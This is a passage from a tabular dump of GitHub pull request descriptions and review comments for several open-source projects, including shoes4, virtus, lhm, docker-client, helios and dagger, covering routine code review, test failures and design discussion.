@jasonrclark I'm not sure how this should mix with #832. Based on what I see I think they should play nicely.","[""Had a few small comments throughout.\r\n\r\nOnce those are dealt with, the only other thing I'd encourage you to do is run some of the text-heavy samples--in particular `samples/simple-manual.rb`. Running just that sample has caught me a multitude of text block bugs before I pushed them out. :sweat_smile: \r\n\r\nIf the styling looks unchanged between master and your branch, specs are good and no one else has any commentary to give, I'd :+1: to merging.\r\n\r\nThere are reasonable odds that this will conflict with #832, but I'm happy to hold on that and I'll just rebase things myself on that end for the change. Thanks for calling it out!"", 'Alright I think this addresses everything we talked about, it passes specs.\r\n\r\nI tested the manual and discovered that the `link` `:fill` needed to be set to `nil`. Having fixed that, it looks like everything works.', 'Cool, thanks for the quick turnaround. Hurray for the manual flushing out bugs :rocket: \r\n\r\n:ship: ']"
655,shoes/shoes4,1061.0,"Hello. Here's a fix addressing #778 . Although clicking regions seem to be right, it's hard to hit a line since it requires pixel-level aiming. Shall we add some sloppiness to it?","['Looks good, I\'d appreciate a bit more communicative naming.\r\n\r\nRegarding adding ""sloppiness"", my first thought was to be pro on it but then my second thought was that if someone REALLY wants a line to be clickable they can just make the line thicker, which lead me to notice that the thickness of the line is unaccounted for as of now.\r\n\r\nI\'m unsure which option sets the line thickness... `weight` or soemthing it was I believe', ""Went through the same thought process as @PragTob... the sloppiness seemed good initially, but then would block someone from actually getting the precise result.\r\n\r\nIt's a good point about the line's width, though! It's actually `strokewidth` in the element's styles that takes care of setting that. ([Relevant code where the graphics context gets it](https://github.com/shoes/shoes4/blob/master/shoes-swt/lib/shoes/swt/common/stroke.rb#L34) )\r\n\r\nAn example app in action with a thick line:\r\n\r\n```\r\nShoes.app  height: 250 do\r\n  line 0, 0, 100, 100, strokewidth: 8\r\nend\r\n```\r\n\r\n![image](https://cloud.githubusercontent.com/assets/130504/6243516/dee606ea-b6f7-11e4-9a56-61ce5c0874e3.png)\r\n"", ""@jasonrclark Ahh, I see now, I'll try to figure out some algorithm that would take that into account."", ""@seethemhigh what's the state of this? :) Do you fancy any help or something? :) Thanks for all the work!"", ""@PragTob Oops, sorry, haven't looked at it since discussing that rotation bug mentioned in #778 . But! Here are some thoughts: when there's a strokewidth applied, a line turns into... a rectangular! Which is obvious :) So basically the current `in_bounds?` needs to check whether `x, y` is inside the rect. \r\n\r\nAnother idea. Turning `x, y` params into a square with sides equal to strokewidth. Then we basically need to check if a line crosses the cursor rect.\r\n\r\nI'll try those ideas in the coming days, hoping to finish this soon :)\r\nThanks for reminding!"", ""A total rewrite of the method. The algorithm was shamelessly stolen away from [here](http://math.stackexchange.com/questions/60070/checking-whether-a-point-lies-on-a-wide-line-segment). Specs are kinda messy, aren't they? :)"", ""Great, thanks! :)\r\n\r\nI left a couple of comments mostly regarding naming :)\r\n\r\nI actually really like the specs, they might benefit from one or two more specs checking the correct working with boldness but that's no must.\r\n\r\nCheers and thanks a lot,\r\nTobi"", 'Thanks for the adjustments :+1: ', 'Looks great, thanks - moved this weekend hence the lateness :)']"
656,solnic/virtus,112.0,"[Issue #98](https://github.com/solnic/virtus/issues/98)

Here we are.","['This pull request [fails](http://travis-ci.org/solnic/virtus/builds/2304839) (merged 5ab13cee into 0d72026a).', 'This pull request [fails](http://travis-ci.org/solnic/virtus/builds/2304861) (merged 17a62408 into 0d72026a).', ""@greyblake it looks like you left in a `require 'pry'` line in the specs, and travis is blowing up because it's not a gem dependency. I'd suggest removing that line since we don't want to add any dependencies that aren't absolutely necessary.\n\nAlso, this may be something you're already doing, but make sure you run `rake ci` which will run through the tests as well as some deeper checks of the code that we require the code to meet."", 'This pull request [passes](http://travis-ci.org/solnic/virtus/builds/2309496) (merged c9e592fc into 0d72026a).', ""@dkubb, thanks for catching `pry`. I just used it for local debug. Removed in \t05bd947\n\n`rake ci` allowed me to detect that one of my methods is not covered, but the output is pretty urgly:\n\n```\nrake ci\n[warn]: in YARD::Handlers::Ruby::MixinHandler: Undocumentable mixin: YARD::Parser::UndocumentableError for class Virtus::Attribute\n[warn]: \tin file 'lib/virtus/attribute.rb':10:\n\n\t10: include Equalizer.new(inspect) << :name << :options\n\nCoverage: 99.8% (threshold: 100.0%)\n[warn]: in YARD::Handlers::Ruby::MixinHandler: Undocumentable mixin: YARD::Parser::UndocumentableError for class Virtus::Attribute\n[warn]: \tin file 'lib/virtus/attribute.rb':10:\n\n\t10: include Equalizer.new(inspect) << :name << :options\n\nrake aborted!\nCoverage must be at least 100.0% but was 99.8%\n```\nThere defenetly should be a way to find out what code is not covered.\nFinally with simple cov i detect it and write a spec: \tc4a9101\n\nThanks."", ""@greyblake yeah, you can run the `yardstick_measure` rake task, and then check the report in `./measurements`.\n\nMost of the output comes from parsing errors in YARD so other than silencing them I don't know if there's anything I can do in yardstick to make them go away."", '@dkubb  To avoid yardstick warnings we can extract module created dynamically into a constant:\n\n```ruby\n    # Some doc\n    AttributeEalizer = Equalizer.new(inspect) << :name << :options\n    include AttributeEalizer\n```', 'This pull request [passes](http://travis-ci.org/solnic/virtus/builds/2311953) (merged 0242d1c6 into 0d72026a).', 'This pull request [passes](http://travis-ci.org/solnic/virtus/builds/2312168) (merged 68793d27 into 0d72026a).', '@dkubb @solnic  Does something remain to do to merge this pull request?', ""Yes. Me or @dkubb must find time to do the final review and merge :) I'll work on it when I'm in Kiev next weekend :) conferences == OSS hacking :)\r\n\r\nOn Tuesday, September 25, 2012 at 3:00 PM, Sergey Potapov wrote:\r\n\r\n> @dkubb (https://github.com/dkubb) @solnic (https://github.com/solnic) Does something remain to do to merge this pull request?\r\n>  \r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub (https://github.com/solnic/virtus/pull/112#issuecomment-8853190).  \r\n>  \r\n>  \r\n>  "", ""Ok.\nBtw, I look forward to your talk in Kiev and hope I'll catch you there:)"", '@greyblake thanks for that. I just merged it in :)', 'Great! Thanks))']"
657,solnic/virtus,314.0,"Closes #310. 

I did a simple implementation based on what the code that supports the `strict` option, so let me know if I shouldn't take down this road. I still want to give a review of my own on this later and update the README documenting this feature before getting this merged :smile:.","['wow that was fast :) I left one comment, tell me what you think, cheers!', ""Just pushed the tests of having `nullify_blank` and `strict` working together, but looks like `required` might not work as expected - since it is a piece of the `strict` logic. Maybe extracting it to a module that has precedence over both `strict` and `nullify_blank` might improve this but I haven't looked deeper enough through the code."", '`required` flag means whether `nil` is an acceptable value or not for a specific attribute, I suppose setting `nullify_blank` implies that `required` should be `false`.', ""@solnic OK, so I think the current tests cover this case when all options are `true` and we don't raise a coercion error when the nullable input is provided. I guess we are done with the implementation here, so let me know if we need to change/add something before merging this."", ""@lucasmazza awesome, thanks! I'm gonna merge it in and see how it works in my apps and then we could push it out in the next release. This will simplify rom-rails so that's really cool."", ""@solnic nice! I tested in my current project and it worked as expected - it isn't a large app but I've managed to remove our implementation of custom attribute classes that supported this behaviour with the configuration option directly.""]"
658,solnic/virtus,167.0,"Removes the global pollution of class-level configuration while maintaining backwards compatibility with the previous style.

* A configuration instance is used at the `Virtus` level
* `Attribute.coerce` is deprecated and proxies the value to `Virtus.coerce`
* Added `ModuleBuilder` used by `Virtus.module` to allow for Virtus module creation
* Configuration is injected into the module via an included hook by overriding the `.attribute` method with custom configuration options.
","[""@solnic - With that last commit the specs I have are running. I believe this is a good starting point for us to discuss if it's operating the way we want it to and if the API is usable."", ""This is twisted :D and so cool. let's see how it evolves :)"", ""@solnic, ready for a review at your convenience. Once you've weighed in, I'll make the changes, rebase, split up some commits, and update the PR so we have a proper commit log."", ""@solnic: I put in some hours on this today to push forward. I am starting to feel good about the end result. I'm struggling with the best way to unit test `ModuleBuilder` in the rspec-style you have in this repo. Can we get some time to review and break my brain a little?"", ""@solnic, I think we've got something here now! \r\n\r\nI know we were discussing leaving out the `ModuleBuilder` specs but I found the coverage had dropped below 100%. I took the opportunity to attempt to get `ModuleBuilder#attribute_method` and `ModuleBuilder#add_included_hook` covered. Are these worth making `private` and skipping the specs? (They feel very internal to me).\r\n\r\nOther than that I think we're looking good. I squashed some commits and cleaned up spec style where needed.\r\n\r\nLet me know what you see."", '@elskwid :heart: :+1:', ':tada: :tada: WOOOO :tada: :tada: ', '@elskwid btw this probably deserves some info in the README. I plan to extract advanced stuff from README to wiki for 1.0.0 final but we could already have it in the README so I could just copy it later.', ""@solnic - You read my mind! I was just looking at the README. I'll get it updated shortly."", ':+1: :sparkles: ', 'README updated in #174 ', '\n[![Coverage Status](https://coveralls.io/builds/1104654/badge)](https://coveralls.io/builds/1104654)\n\nChanges Unknown when pulling **ef2204a949a7bc711756dc346f1b612236e86165 on elskwid:module-builder** into ** on solnic:master**.\n']"
659,soundcloud/lhm,93.0,"## Problem

If the metadata lock is taken a LHM will fail with  lock wait timeout

## Solution

Sleep one second and retry until we succeed or reach  `MAX_RETRIES`.

This is a patch already merged and used in Shopify/lhm

@arthurnn  @jasonhl 

","['cc @sroysen @SingerWang ', 'Can you add a changelog entry?', 'Failed on some ar versions that we might not care now?\r\n\r\n![build__231_-_soundcloud_lhm_-_travis_ci](https://cloud.githubusercontent.com/assets/7748/6376672/63784bde-bced-11e4-9520-0ae6abc43f94.png)\r\n', 'hmm lies failure is legit, will fix', '@arthurnn tests should be working now but travis is :hankey: y at the moment.', ""@arthurnn do you have admin on travis, I suspect that concurrent tests are making this fail, the reason is the test that tests locked txs will lock the whole db, which is fine when it is running in isolation, if it happens to lock the db when something else is running that test will fail and probs make the locking test fail.\r\n\r\nIdeally we have to diff test commands with diff concurrency but to test that I'm not wrong would be good to reduce the concurrency of the build to 1, and see. travis did add that but AFAIK it cannot be controlled from `travis.yml` https://github.com/travis-ci/travis-core/pull/367/files"", 'I retried only one build to see if would pass, however still getting this error:\r\n```\r\n 1) Error:\r\nLhm::AtomicSwitcher::switching#test_0002_should give up on lock wait timeouts after MAX_RETRIES:\r\nActiveRecord::StatementInvalid: Mysql2::Error: closed MySQL connection: SELECT DATABASE() as db\r\n```\r\nsee  https://travis-ci.org/soundcloud/lhm/jobs/52670405', '@arthurnn \r\n\r\n> ActiveRecord::StatementInvalid: Mysql2::Error: closed MySQL connection: SELECT DATABASE() as db\r\n\r\nIs weird sounds to me like travis being not great.', 'was it configured with a single job at a time ?', '@camilo I am running this tests locally, and they randomly fail. So , I dont think this is travis related.\r\nI am guessing we are missing a teardown/clean method on the new tests on atomic_switcher_spec.rb , or something like that. Because seems like that is leaving behind bad state.', 'works on my machine :tm:\r\n', ""I'll check."", ""@arthurnn what failures? I can't repro."", 'https://gist.github.com/arthurnn/a337b91797c228366b76', 'ping @camilo ', ""OK sycned those threads better, this should pass as long as the test don't run in parallel, if they do the locking thread for a test could lock any other db op and cause weird failures."", ""ok passes now... small-ish caveat, I'm throwing mysql (the old mysql gem) under the :bus: here and not even attempting retries."", 'this looks great camilo!!! thanks a lot!\r\n:heart: :heart: :heart: :heart: :heart: :heart: ', ""Any chance of releasing a new version to RubyGems? It's been a full year since the last release, and this critical bug has never made it into a release."", '@m1foley thanks for the notice. I will put together a release soon', 'Thanks! I have some migrations to do in the meantime -- can I assume that `master` is safe to use in production environments?', ""@m1foley Yes the one thing you might hit that I'm not sure has been merged is if for some reason you LHM a table with a single row  you might lose that row, there are two patches for that on the PRs, on the other hand why would you LHM a table with a single row?""]"
660,sporkmonger/addressable,189.0,"Ive cherry-picked the CI build optimizations, originally included in https://github.com/sporkmonger/addressable/pull/174, into their own pull request. Please let me know if youd like me to subdivide these any further.","[""A nice side-effect of this getting pulled out into its own PR is that it's now much clearer what you were trying to accomplish. :-)"", 'Thanks for merging!']"
661,spotify/cassandra-reaper,75.0,,"["":-1: \r\nI have still hard time liking or accepting the hierarchy approach for the view. I feel it's way more complex it should be. With one flat method filling up a view object feels like it would be 5 times smaller, and there would be no need to wrap head around hierarchical structures. What do you feel we gain from this hierarchical approach in the view?"", ""Yep, I switched approach at the end, and the whole hierarchy package is unused. In fact, if you remove it, it still compiles. So what the new cluster resource response does is actually just that new SQL query that you found newlines in (I will removed those). That should align much more with what you suggest in this comment.\r\n\r\nThere are a couple of reasons why the hierarchy package is still there (let's discuss that elsewhere). Though, I should probably remove it from this branch and make that a completely separate branch. I'll do that now."", ""I guess it is fine to merge now. Let's check more details later. :+1: ""]"
662,spotify/docker-client,13.0,,"['Parse the unfortunately unstructured ""Successfully built badf00dcafebabe"" message and return that to the user as an image id?', ""Looks very good overall, with the commented things fixed it'll be a great addition. ""]"
663,spotify/docker-client,51.0,"This lets us use the async support in Jersey rather and get rid of our interruptible client
handlers.

It's also a step on the way to proper TLS support.","[""Just FYI, one of the reasons I chose docker-client instead of https://github.com/docker-java/docker-java was because this project used Jersey 1.x, which is what Dropwizard 0.7.x uses. It'd be great if this change would become a 3.0.x release so that 2.x releases could continue to use Jersey 1.x. This is hopefully somewhat short-term (as in months) until Dropwizard releases their Jersey 2.x compatible version."", '@tedyoung :+1:  same goes for me... The dependencies are key to the selection, the less, the better... ', ""I assumed (incorrectly) that we'd be good since Jersey 1.x and 2.x have completely different package names \xe2\x80\x94 `com.sun.jersey` versus `org.glassfish.jersey`. Unfortunately, it seems that both versions include incompatible classes in `javax.ws.rs.**`. This kills our Dropwizard stuff dead.\r\n\r\nGoing to have to figure out another approach. Going to 3.x makes sense, but I don't know that we have the manpower to maintain two versions.\r\n\r\nIn other news, apparently Dropwizard 0.8.0-RC1 may drop by the end of the week, which would be nice."", ""@tedyoung @drewcsillag Thoughts on shading + renaming docker-client's dependencies to avoid this problem?"", ""Personally since Dropwizard 0.8.0 seems so close, I'm fine with just moving to the 2.x Jersey. Shading could work, but seems like it'd add somewhat unnecessary complexity. Of course I'm able to easily move to 0.8.0 once it's out. "", ""@tedyoung Actually merged this with the shading stuff last week. Agree that there is some added complexity (~40 lines of configuration in the pom, etc.), but it seems to be working and I think it's worth it \xe2\x80\x94 users now don't have to worry at all about what version of Jersey they might have on their classpath."", ""@rohansingh  If this removes versioning hell, I'm all for it... can we get a snapshot of this branch somehow?"", ""@mosheeshel This branch has been merged to master a while ago, so if you pull the latest master and build you'll have it. It will be in the next release too.""]"
664,spotify/helios,23.0,,[]
665,spotify/helios,49.0,,"['Did you push the changes?', 'On Mon 30 Jun 2014 11:07:52 AM EDT, Daniel Norberg wrote:\n> Did you push the changes?\n>\n> \xe2\x80\x94\n> Reply to this email directly or view it on GitHub\n> <https://github.com/spotify/helios/pull/49#issuecomment-47543175>.\n>\n\nNot yet.', 'Changes pushed.', ""Seems there's a few checkstyle warnings."", 'Sorry for all the nits.', 're: nits.  No worries.  Good catches all around.', ':+1: ']"
666,spotify/helios,61.0,"...nt runs.

If a run of TemporaryJobs is killed off while jobs are still deployed,
they will be left running. This can lead to a lot of abondoned jobs still
running. To prevent this, TemporaryJobs now genereates a random string for
run, and uses this as a prefix for each job name. This string is written
to disk as the name of file in /tmp/helios-temp-jobs. When TemporaryJobs
starts, it will read all files in this directory, and delete all jobs
which start with the prefix. If TemporaryJobs runs to completion, and
all jobs are undeployed successfully, the temporary file will be deleted.","[""Looks good overall. There's a few nits and a simple race condition around the file creation that would be great to have fixed."", ':+1: good stuff!']"
667,square/dagger,306.0,"This is the refactoring that @cgruber mentioned in #303. The first two commits fix minor errors and the last two are completely refactoring including:

* significant changes in InjectAdapterProcessor which eliminate code duplication, increased readability, and also changed to follow the naming scheme proposed in #303.

* changes in ModuleAdapterProcessor mostly just to comply with the naming scheme.

","[""LGTM (with some nitpicks. Please address & I'll merge)"", 'PTAL. ', 'PTAL', ""LGTM\r\n\r\nPlease squash your commits and I'll merge!"", 'I squashed to two commits separating the fixes from the pure refactoring. Can squash to one if you prefer']"
668,square/dagger,146.0,"Another regression from #133 fixed here.  `injectMembers()` should no-op for generated code, so flip the default (so we don't have to generate them) and fix up subclasses.

On the way, switch some `UnsupportedOperationException`s to `AssertionError`s since these are code paths that should never be called.",['LGTM']
669,square/dagger,162.0,"Any throws clause is rejected, even one documenting a RuntimeException or
Error.

Fixes #160","[""Looks good aside from some style nitpicks. Address those and we'll get this merged."", 'Only updated the copyright year.']"
670,square/dagger,170.0,also updated Linker.linkRequested and putBinding to be consistent about putting scoped bindings into both the toLink and bindings lists.,"[""So I'm happy with this, modulo some naming and style nits in which I am lightly channelling @swankjesse.  I'll wait for the fixes to merge, and be warned, Jesse might pipe in as he is the keeper of style and I might have missed things.  \r\n\r\nThat said, once all the issues are addressed, please send a PTAL (please take a look) or something similar, so we know to proceed with further review or merge."", ""OK, I've (locally) made the changes you suggested, @cgruber .  I'll wait for @swankjesse to review before resubmitting the pull request, in case he has additional comments."", 'You shouldn\'t need to re-submit the pull request.  Just once everyone is all ""Looks good to me"" here one of us will merge it. ', ""Oh... never mind... I get it. You dont' have to re-submit... if you git-push this branch, this Pull Request will see it."", ""right, that's what I meant, sorry, should have used clearer wording."", 'LGTM aside from one problem in the test', 'OK, updated based on feedback from @cgruber and @swankjesse .']"
671,square/dagger,168.0,"Rework `ProvidesProcessor` to generate `ModuleAdapters` even when no `@Provides` methods are present.

This averts needing to fall-back on the reflection back-end in the case of no provider methods.  

This change also adds some tests for stateful modules used in extension graphs, fixes some error text related to module instantiation, and makes ModuleAdapters thin when no provides processors and/or accessible constructors are available.","['I also noticed modules with no `@Provides` methods had no `MethodAdapter` generated, and had a change in the works. My approach however was rather to split `ProvidesProcessor` into a `ModuleProcessor` (`@SupportedAnnotationTypes(""dagger.Module"")`) and `ProvidesProcessor`. `ModuleProcessor` would do almost all of what `ProvidesProcessor` currently does (generating the `ModuleAdapter`s) and `ProvidesProcessor` would only validate the `@Provides` methods (are they `static`? `abstract`? `private`? within a non-`static` or `private` class? outside a `@Module` class?).\r\nWith your current approach, I\'m afraid you won\'t generate a `ModuleAdapter` if the current round only contains `@Module`s with no `@Provides` method, because the processor wouldn\'t be triggered at all.', ""Couldn't that be handled merely by including dagger.Module in the \nsupported annotations for that processor?"", ""Possibly (probably). You have to change the `process()` method to return `false` though, or that would prevent the `FullGraphProcessor` from being triggered (unless it's moved above the `ProvidesProcessor` in the `META-INF`, and itself changed to return `false`)"", ""Yes.  My other approach was similar to yours, and we definitely need to \nreturn false.  I'm trying to keep from growing the number of independent \nprocessors for reasons that are really to-do with google's internal \nbuild system.  But regardless, yes - I'll update to support Module (it \nis really a processor of modules) and return false to not conclude \nprocessing of modules."", 'PTAL', ""Grr.  I'll fix the checkstyle errors.  Must run verify before pushing... :("", 'ping?', ""I dont think it's bogus exactly - you're just inverting the if, so to speak.  I nearly did it that way - I'd rather fix this now, so its correct, then re-work it in an internal reorganization branch.  This is a fix. If you want it to be temporary, I'm ok with that, but this change improves the current and doesn't leave us worse off. "", 'Sounds good. Several pedantic nitpicks on the fix, but the solution is solid. I\'d really like to re-think our overall code-gen strategy for some sort of ""Dagger 2.0""', 'Agreed.  2.0 will be even moar awesum.  Fixing out the issues you mention, and next push should be it, presuming travis.ci agrees. ', 'PTAL', 'LGTM, just one nitpick on an exception', 'PTAL']"
672,square/dagger,193.0," * Private fields are not supported.
 * Private constructors are not supported.
 * Methods are not supported.

Closes #181. Closes #113. Closes #112.","[""Note: runtime exception-throwing for `@Inject`-annotated methods isn't supported or tested. This would require looping through all declared methods just to throw an exception or do nothing. Didn't seem worth it."", 'LGTM. One small nitpick around the order of the two checks.']"
673,square/dagger,196.0,Closes #188.,['LGTM']
674,square/dagger,212.0,,"['This is compile-time verification of #210 only. This also only handles the ""dumb"" case of having the provider or lazy type explicitly as your return type. If you have a type which extends from either of these two then you\'re 100% on your own and I think that\'s a fine assumption to make.\r\n\r\nThis does not include reflective verification in core. If this gets a thumbs up then I can look into adding that as well.', 'In principle, I agree with this, and with the assumptions you\'re making \nabout providing specific subtypes and ""breaking the warrantee"" in that \ncase.  I also think this should be enabled in the reflection back-end.  \nThis is the right change, from an API perspective.  I\'ll have to let \nsomeone else critique the code, or get to it later, sorry.', ""LGTM, aside from @tbroyer's suggestion"", 'Updated. Also added reflection backend check and test.', ""LGTM, but I think raw types should probably be tested in the reflection backend (it's rather obvious they'll be ruled out in the codegen backend)\r\n\r\n```\r\n   @Provides Provider providesRawProvider() { return null; }\r\n```"", 'Updated both compiler tests and reflection check/test for raw types.', ""LGTM\n\nI'll let someone else do the merge though.""]"
675,square/dagger,205.0,"...rue)

@swankjesse 

Needs rebase, but I said I'd send out a pull tonight so....

![](http://imgur.com/gtjeYF1.png)","['Amazing.', ""Nice picture, @kryali.\r\n\r\n@cgruber,\r\nWe're trying to build on our strengths as a dependency injector with built-in static analysis. Kiran noticed that our app had some `@Provides` methods that weren't being used, but we had no mechanism to discover this dead code. So he built one.\r\n\r\nWith this change it is an error for a module to include an `@Provides` dependency that never gets used. This is similar to our other check where we fail if an `@Provides` dependency is missing. We'll need to cover this thoroughly in the Javadoc on `@Provides`, where I anticipate something like this:\r\n\r\n**complete=true** means all necessary bindings are included\r\n**library=false** means all included bindings are necessary\r\n"", 'Ok - so this is the orphan analysis we talked about earlier.  That\'s \ncool - do we want to do this at the whole-module level, or do we want to \nannotate particular explicit bindings as being for library use.  And why \nnot use entryPoints for this?  These present but orphaned bindings are \nreally entry points into this module\'s part of the graph.\n\nThese are sort of meandering thoughts, but I think we need a deeper look \nat the whole approach to what\'s in/out, visible/hidden, \nnecessary/optional in the graph, and how we specify it.  I\'m not sure \njust listing a module as a library (and therefore orphan-allowed) is the \nright level.  Not sure it isn\'t either - just trying to wrap my head \naround it.\n\nJust to clarify what I read as going on here - if I have a module - its \ncompleteness is the marker of whether it is expected to have (explicitly \nor JIT bound) all necessary bindings available, so it requires no other \nmodules to satisfy the graph\'s needs.  Yes?\n\nAnd, then, semi-unrelated, if I have a module that will be used as a \nlibrary - as a set of pre-fab bindings consumed by some other, complete \nmodule, then library=true marks it so that any orphaned (present but \nunreached from an entry-point) bindings are not considered an error?  \nAnd the default is that orphaned bindings are an error?\n\nI guess I can go along with that at this level.  But I still wonder if \nwe shouldn\'t have an `@Library` marker on the `@Provides` method itself. \n  Even as I write that, though, I think it\'s more likely that one would \nmake ""library modules"" whole-sale more than one would have selected \nlibrary-level bindings.  So maybe it\'s ok.\n\nSorry this is rambling - I\'m trying to wrap my mind around this in the \ncontext of other conversations that Jesse and I have had.', 'Yup. We implemented it at the `@Provides`-level and then realized it worked better at the module level.', ""Bunch of nitpick comments, nothing major. Most interesting one is to use the word 'library' internally instead of mixing 'library' and 'necessary'. Address 'em, I'll take a final look and we can check this in."", ""Jesse's nits notwithstanding, I'm much more enthused now about this change.  Had to get my head around it, and that worries me for communicating it - I think we need to beef up the docs to be clearer, but it makes a lot more sense now. \r\n\r\nMaybe we need a table illustrating the different usage implications of complete and library.  "", 'Also, I want to steal that meme. ', 'Yeah, I think we could probably add a section to the dagger website that explains our static analysis & graph building.', '@swankjesse \r\n\r\n```\r\n[INFO] ------------------------------------------------------------------------\r\n[INFO] Reactor Summary:\r\n[INFO]\r\n[INFO] Dagger (Parent) ................................... SUCCESS [1.581s]\r\n[INFO] Dagger ............................................ SUCCESS [6.293s]\r\n[INFO] Dagger Compiler ................................... SUCCESS [1:06.895s]\r\n[INFO] Dagger Example (Parent) ........................... SUCCESS [0.014s]\r\n[INFO] Dagger Example - Simple ........................... SUCCESS [1.246s]\r\n[INFO] ------------------------------------------------------------------------\r\n[INFO] BUILD SUCCESS\r\n[INFO] ------------------------------------------------------------------------\r\n[INFO] Total time: 1:16.262s\r\n[INFO] Finished at: Wed Apr 24 18:01:35 PDT 2013\r\n[INFO] Final Memory: 19M/81M\r\n[INFO] ------------------------------------------------------------------------\r\n```', ""LGTM. \r\n\r\nThree nitpicks. Let's get this merged.""]"
676,square/dagger,223.0,"Simple example showing how to integrate Dagger and Android as well as a more complete example showing per-Activity graphs.

Since Travis CI hates Android we explicitly disable the modules being compiled in the build config.","['LGTM fantastic', 'Lets Get This Merged']"
677,square/dagger,226.0,"...der check Closes #216 

@swankjesse 

cc @JakeWharton ",['LGTM with one problem about staticness']
678,square/dagger,271.0,"Request classloading from the classloader of the requesting object, not the current thread's context classloader.  

Use the context classloader only for classes loaded in the bootstrap loader (say, if Array.class or String.class is an entry point).  Also use the context classloader in the compile-time analysis-only adapters/bindings, since they all happen in the process of the java compiler, and we don't have the real types - only type mirrors and elements. 

Also, this P/R ups the method length (in lines) maximum as the current 150 is insufficient for the full code-gen methods.  We could shorten them again with some refactoring, but that needs to be in another P/R I think. 

This approach is a better alternative to the approach in #263, which used the loader of the module.  By building from the entry-point, and using the requesting object's owning classloader, we get a path along a real chain of classloaders, and this chain has to match the classloader visibility rules, because otherwise this code would never be loadable in any case. ","[""looks reasonable, and the description sounds reasonable, too.  It would be nice to have a test that shows the classloader isolation operating.  I slightly cringe, know that probably isn't straightforward."", ""I have tests in mind.  I may have to submit this into our fork more hastily than constructing the test.  We have a project that needs it.  If this group is ok with me submitting a test separately, I can merge here, and port in.  Otherwise, I'll have to do this in two places and merge later. "", ""I'm cool with tests happening later."", ""I'm not convinced that we ever want to store the context class loader. The context class loader is a thread local and intended to allow low-level libraries to get the class loader of their high-level callers.\r\n\r\nInstead we want to find the class loader that's tied to the class we're loading. For anything that comes from a module, we want the class loader of the module class."", ""my other approach was to go for module's classloader, but I realized that the amount of extra state we would have to keep to tie everything to its module directly (due to includes= and other factors) is an even bigger change. I ended up carrying the module everywhere and it was gross.\r\n\r\nBy tying to an entry point and using the owning loader, I'm following the logical chain of the real classloaders as they must exist for the hiararchical classloading to work at all.  Gak helped me see this by distinguishing in my terminology the requesting vs. the owning loader.  \r\n\r\nI don't think we want the context classloader either - I was searching for a sane default.  I think if we can't get this strategy, it would be equally hard to get the module's classloader. So going for the system classloader and simply failing to load is sane."", ""Will the getSystemClassloader() load classes properly in the compile-time bindings?  I don't know enough abotu the loader structure underpinning annotation processors. "", 'Never mind - I can find out myself by trying it. :D', 'Yeah... I\'m not sure we don\'t want getClass().getClassLoader() where we can\'t find the requester\'s classloader.  Taht would at least let it work in, say, a webapp where the webapp loaded Dagger itself inside its own classloader, but not from the system classloader. That\'s what `Class.forName()` does - the equivalent to `Class.forName(""foo"", this.getClass().getClassLoader());`', ""Sorry, I don't think I made myself very clear. I think you want to use the system class loader whenever you want to use the class loader of a class, and that class loader turns out to be null. For example if you ask String.class what its class loader it uses, and it returns null, then you should use the system class loader.\r\n\r\nYou definitely don't want to use the system class loader in any other situation. The system class loader is the root of the class loader tree, and so it can't see application classes. It won't be useful here.\r\n\r\nI think the only correct class loading behavior is to use the class loader of the modules. You can attempt to be precise and use the class loader of the module that referenced a type, but sometimes a type won't ever be referenced directly by a class loader. For example, when you load Foo and that needs a Bar injected, that might be the first time we ever see Bar.\r\n\r\nPerhaps what we want to do is track something like requestedBy, but do it for class loaders. Whenever a binding is requested we grab whichever class loader requested it. For `injects=` that's the module's class loader. For dependencies that's the class loader of the depending type. "", ""Oh FFS.  LOL.  I get you now.  I completely misread it.  Ok - I'll fix.  That makes vastly more sense."", 'PTAL', ""LGTM after a few small nitpicks.\r\n\r\nI think we want to change requiredBy into two fields, requiredByBinding and requiredByName, where we will only set one or the other. If a binding comes as a dependency we can use the requiring binding. If it comes from a module, we'll use the method name or module name.\r\n"", '(If we do that, then we can use requiredByBinding to get the class loader)']"
679,square/dagger,279.0,"Patched from the google fork

Rework the default loader into a cleaner, more explicit FallbackLoader, and turn the previously chained loaders into ingredients that could be used in this or other loaders.

This has a benefit of throwing fewer exceptions (and incurring stack-trace building costs) during normal expected operation (such as our fallback for supertypes).

Additionally, I think this is cleaner, as the chaining was too-clever and I worked too hard to make the raw logic of loading adapters and creating reflective adapters conform to the Loader API.  This change leaves the raw logic in utilities that could be used to build other loaders (reflection only, generated-loading-only, etc.) but without trying to shoehorn things into a common API and handle the interaction between these strategies in a common way.  This is simply much cleaner as a ""do-this, did it work? No, ok do the other thing. Return what we got in the end."" pattern.","[""The second commit is a style fix for square, so I'll not want to squash it, so I can cleanly merge it back into the google fork. "", ""Also, sorry about the rename fail.  I can't get it to recognize that rename-modify unless I reconstruct everything."", 'LGTM after comments.\r\n\r\nThis is very nice work. ', 'Late to the party, but nice work! Thanks for making these public access, too.']"
680,square/dagger,292.0,"Create a cache for class loading that both successfully loaded classes, as well as class lookup failures (using Void.class as a null object).

This change also reworks the loading infrastructure to not throw/catch class cast exceptions since we expect cache misses in certain cases, and we want fast response to multiple lookups.","[""Side note - We (notably Greg @gk5885) did a bunch of profiling internally and found that, in a high-performance server situation, they were using sort of micro-scopes with child-injectors, but it meant they were doing a classloader.loadClass() very very frequently in a class-loader chain greater than a few deep.  This meant that for N classloaders in the chain, N-1 stacktraces were being generated to supply all those ClassNotFound exceptions if the class was from the near-most classloader.  When the load failed, that work was done over and over and over (hence this P/R's choice to cache failures).  But even when it succeeded, it turns out that loadClass() is still slower than an in-memory cache of the class. \r\n\r\nGreg posted fairly substantial performance gains with a quick and dirty caching using (I believe) a WHM on classloader, with a CHM on classes.  I opted for a double-checked LHM so we could use an LRU strategy for cached classes.  If the classloader is expired from memory, then the WHM will drop it.  But I didn't want an interminable array of classes so I put an item limit on the inner cache. \r\n\r\nThis should make classloading in dagger about as fast as we can, short of eliminating the reflective classload entirely (something we hope to do in nearly all cases soonish). "", ""So, since LruCache seems to work nicely for the inner cache, I think rather than try to pull in a concurrent weak hash map structure scraped from Guava, I'm going to try to do a read/write lock around the weakhashmap.  That seems like it'll avoid one-global-lock-on-all-reads, and keep the get() safe.  Unless anyone has a better suggestion. "", ""Yup, that's perfect."", 'PTAL', 'PTAL?', 'PTAL.  Reworked the caching as an instance variable of Loader, which is now an abstract class.  The whole thing is much cleaner and tighter.  The constraint on classloading is that if you want replacement classloaders, you junk the graph.  New (root) graph == new loading cache, so if you do fancy classloader unloading, you simply merge that scope with your application/top scope, and recreate the root when you reconfigure. ', 